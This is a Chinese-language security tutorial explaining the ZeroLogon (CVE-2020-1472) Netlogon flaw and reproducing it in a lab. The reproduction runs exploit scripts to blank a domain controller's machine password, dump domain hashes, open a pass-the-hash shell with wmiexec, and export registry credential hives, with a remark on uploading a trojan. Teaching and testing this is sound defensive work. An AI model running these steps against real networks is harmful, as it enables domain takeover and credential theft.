[TOC]



# ==ZeroLogon漏洞利用==

教材内容

#### 一、漏洞概述

2020年08月11日，Windows官方发布了 NetLogon 特权提升漏洞（又称“Zerologon”）的风险通告，该漏洞编号为CVE-2020-1472，CVSS评分为10分的高危漏洞。该漏洞是由于Netlogon的加密实现中存在安全问题，导致攻击者可以通过利用该漏洞来劫持企业环境下的服务器设备。该漏洞将允许攻击者为活动目录域控制器的计算机账号设置密码，并从域控制器中导出凭证数据。

影响系统版本：
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

#### 二、漏洞浅析

##### 2.1 Netlogon

Netlogon 是一个远程过程调用 (RPC) 接口，在域环境中对域用户和计算机进行身份验证，其有诸多功能，例如维护域成员与域控制器 (DC) 之间的关系；维护跨域的多域控制器之间的关系以及复制域控制器数据库。具体通信过程如下：

![image-20230704151614435](https://gitee.com/ymq_typroa/typroa/raw/main/202307041516527.png)

1. 客户端向NetLogon服务器发送八个随机字节（Client Challenge）。
2. 服务端用自己的八个随机字节（Server Challenge）作为回复。
3. 双方将两个随机字符串合在一起使用用户的hash（secret），生成一个一次性的加密密钥，称为 SessionKey。
4. 客户端使用Session Key作为密钥生成客户端凭证，并发送给服务端进行验证。
5. 服务端同样使用Session Key作为密钥生成服务端凭证，回复给客户端进行验证。
6. 在双方正常通信，客户端可以进行远程过程调用（RPC），通信过程使用Session Key进行签名封装。

##### 2.2 原理概述

漏洞发生在前面所述的Netlogon认证的Client credential加密阶段，8字节的Client credential使用的是AES-CFB的加密模式计算生成，安全地使用AES-CFB需要将初始向量IV设置为随机，但微软将其设置为了全0，此时虽然Session Key依然是个随机数，但当输入的8字节明文（Client Challenge）也为全0时，由于AES-CFB的强随机特性会导致每一字节结果为0的概率都是1/2，最终结果全部为0的概率就是1/256，所以只要不断将client challenge和Client credential设置为全0就有1/256的概率通过认证。

Client credential的加密方式是AES-CFB，AES-CFB对明文的每个字节进行加密。

首先由16个字节的初始化向量（IV）作为输入进行AES运算得到一个输出，取输出的第一个字节，与明文的第一个字节进行异或，得到第一个字节的密文。

而后，由后15个字节的IV加1个字节的密文作为输入进行AES运算得到一个输出，取输出的第一个字节与明文的第二个字节进行异或，得到第二个字节的密文，以此类推，可得到8个字节的密文作为Client credential。

正常AES-CBF算法运算过程：

![image-20230704153954648](https://gitee.com/ymq_typroa/typroa/raw/main/202307041539710.png)

Netlogon认证漏洞中的AES-CBF算法运算过程：

![image-20230704155011001](https://gitee.com/ymq_typroa/typroa/raw/main/202307041550057.png)

黄色部分为16字节的初始向量IV, 理论上为了保证AES算法的可靠性该部分内容应该随机生成，而微软却错误的将其全部设置为00；蓝色部分为明文，对应client challenge,该部分内容攻击者可控，设置为全00，那么在某个特殊时刻（1/256的概率）就会像上面一样，使得明文与密文。

而Netlogon 允许计算机对域控制器进行身份验证并更新它们在 Active Directory 中的密码，于是攻击者可以冒充任何计算机到域控制器并更改其密码，包括域控制器本身的密码。

#### 三、漏洞复现

##### 3.1 实验环境

域 ：ymqyyds.com

DC：Windows server 2008 R2（IP：192.168.230.132，主机名：dcadmin ）

攻击机：kali （IP：192.168.112.216）

漏洞检测工具：zerologon_tester.py（https://github.com/SecuraBV/CVE-2020-1472）

漏洞利用和密码还原工具：set_empty_pw.py（https://github.com/risksense/zerologon）

##### 3.2 实验过程

在Kali中使用zerologon_tester.py进行漏洞检测：

```
$ python3 zerologon_tester.py dcadmin 192.168.112.100 Performing authentication attempts...Success! DC can be fully compromised by a Zerologon attack.
```

使用EXP将域控的机器密码置为空进行利用，但可能导致脱域影响到目标使用，因此**实战环境下慎用**。

```
$ python3 set_empty_pw.py dcadmin 192.168.112.100Performing authentication attempts...=======================================================================NetrServerAuthenticate3Response ServerCredential:                   Data:                            b'\xf1\x82\x04\x98\xe7\xc7\xe6\xc9' NegotiateFlags:                  556793855 AccountRid:                      1000 ErrorCode:                       0 server challenge b'\xf1>\x80GrW73'NetrServerPasswordSet2Response ReturnAuthenticator:                Credential:                             Data:                            b'\x017\xda\x0e\xe1r\xad\x92'     Timestamp:                       0 ErrorCode:                       0 Success! DC should now have the empty string as its machine password.
```

![image-20241114160033716](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241114160033716.png)

然后可以使用impacket中的secretsdump.py，获取域控上所有的Hash，获取Hash后就可以进行PTH了。

![image-20241114160243709](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241114160243709.png)

用impacket的wmiexec.py进行利用，这里使用administrator（域管理员）的ntlm hash登录

```
$ python3 wmiexec.py -hashes 1111:beeabbdf97a07d8356dbb2bbf617e1ba administrator@192.168.112.100Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] SMBv2.1 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\>hostnamedcadminC:\>ipconfig[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute wmiexec.py again with -codec and the corresponding codecWindows IP �������������� ��������:   �����ض��� DNS ��׺ . . . . . . . :    �������� IPv6 ��. . . . . . . . : fe80::1580:a390:587f:f15f%11   IPv4 �� . . . . . . . . . . . . : 192.168.112.100   ��������  . . . . . . . . . . . . : 255.255.255.0   Ĭ������. . . . . . . . . . . . . : 192.168.112.2
```

![image-20241114160303427](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241114160303427.png)

由于这个修改域控密码只是修改了内存中的密码，所以可以从SAM文件中恢复原来的密码，远控目标机器后通过reg导出SAM和SYSTEM文件，下载到kali。

```
reg save HKLM\SYSTEM C:\Tools\system.save
reg save HKLM\SAM  C:\Tools\sam.save
reg save HKLM\SECURITY  C:\Tools\security.save
lget  C:\Tools\system.save
lget  C:\Tools\sam.save
lget  C:\Tools\security.save
del /f  C:\Tools\system.save
del /f  C:\Tools\sam.save
del /f  C:\Tools\security.save
```

> 可以使用 lput 命令上传木马到目标主机

下载到本地后使用impacket中的secretsdump.py来加载，获取DC机器账户密钥 (HEX) 。

![image-20241114160414188](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241114160414188.png)

使用密钥还原工具进行还原

![image-20241114161245902](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241114161245902.png)

再次使用secretsdump.py脚本，指定DCADMIN$的密码为空进行加载，发现认证失败说明还原成功。

#### 四、修复建议

1. 域控上安装对应补丁（https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1472）。

#### 五、参考文章

1. 域渗透系列—那些一键打域控的漏洞之ZeroLogon（https://www.jianshu.com/p/7bd3f242c09c）。
2. ZeroLogon漏洞(CVE-2020-1472)防御性指南（https://cloud.tencent.com/developer/article/1731506）。
3. 域提权漏洞系列分析-Zerologon漏洞分析（https://cloud.tencent.com/developer/article/2209941）